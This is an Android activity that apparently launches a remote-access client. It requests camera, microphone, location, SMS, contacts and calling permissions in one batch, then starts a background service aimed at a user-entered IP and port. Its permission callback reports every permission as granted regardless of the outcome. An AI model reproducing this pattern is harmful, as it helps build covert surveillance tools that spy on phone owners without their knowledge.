package my.app.client;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import android.Manifest;

public class LauncherActivity extends Activity {
    
    Button btnStart, btnStop;
    EditText ipfield, portfield;
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String[] PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.VIBRATE,
        Manifest.permission.CALL_PHONE
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        // Request all permissions at once
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(PERMISSIONS, PERMISSION_REQUEST_CODE);
        }
        
        setupUI();
    }

    private void setupUI() {
        btnStart = (Button) findViewById(R.id.buttonstart);
        btnStop = (Button) findViewById(R.id.buttonstop);
        ipfield = (EditText) findViewById(R.id.ipfield);
        portfield = (EditText) findViewById(R.id.portfield);

        // Default values
        ipfield.setText("192.168.1.100");
        portfield.setText("5000");

        btnStart.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                startClientService();
            }
        });

        btnStop.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                stopClientService();
            }
        });
    }

    private void startClientService() {
        String ip = ipfield.getText().toString().trim();
        String portStr = portfield.getText().toString().trim();
        
        if (ip.isEmpty() || portStr.isEmpty()) {
            Toast.makeText(this, "Please enter IP and Port", Toast.LENGTH_SHORT).show();
            return;
        }
        
        try {
            int port = Integer.parseInt(portStr);
            
            Intent Client = new Intent(this, Client.class);
            Client.setAction(LauncherActivity.class.getName());
            Client.putExtra("IP", ip);
            Client.putExtra("PORT", port);
            
            startService(Client);
            
            Toast.makeText(this, "✓ Service started", Toast.LENGTH_SHORT).show();
            btnStart.setEnabled(false);
            btnStop.setEnabled(true);
        } catch (NumberFormatException e) {
            Toast.makeText(this, "Invalid port number", Toast.LENGTH_SHORT).show();
        }
    }

    private void stopClientService() {
        Intent Client = new Intent(this, Client.class);
        stopService(Client);
        
        Toast.makeText(this, "✓ Service stopped", Toast.LENGTH_SHORT).show();
        btnStart.setEnabled(true);
        btnStop.setEnabled(false);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            Toast.makeText(this, "✓ All permissions granted", Toast.LENGTH_SHORT).show();
        }
    }
}
